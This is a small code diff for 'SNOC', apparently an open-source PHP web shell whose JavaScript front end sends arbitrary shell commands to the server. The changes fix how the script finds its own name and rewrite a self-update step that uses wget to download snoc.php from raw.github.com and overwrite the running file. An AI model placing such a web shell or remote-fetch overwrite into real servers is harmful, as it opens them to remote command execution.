@@ -147,7 +147,7 @@ function echoJS()
 
 	function Shell(){
 		var current_dir = "<?php echo dirname(__FILE__);  ?>";	// current directory
-		var self_name = "<?php echo __FILE__;  ?>";	// current directory
+		var self_name = window.location.pathname.substring(window.location.pathname.lastIndexOf('/')+1);
 		var history = new Array();				// command history stack
 		var history_pos = 0;					// history position
 		
@@ -369,7 +369,7 @@ function echoJS()
 		// doSnocUpdate
 		function doSnocUpdate() {
 			printShell("<br />Starting snoc shell auto update..<br />");
-			command = "wget https://raw.github.com/tjosten/SNOC/master/snoc.php -O "+self_name;
+			command = "wget 'raw.github.com/tjosten/SNOC/master/snoc.php' -O "+current_dir+"/"+self_name;
 			var fullcommand = "cd "+current_dir+";"+command+" 2>&1;pwd";
 			postShell(fullcommand,function(data){
 				for(var i=data.length-3;i>0;i--) {
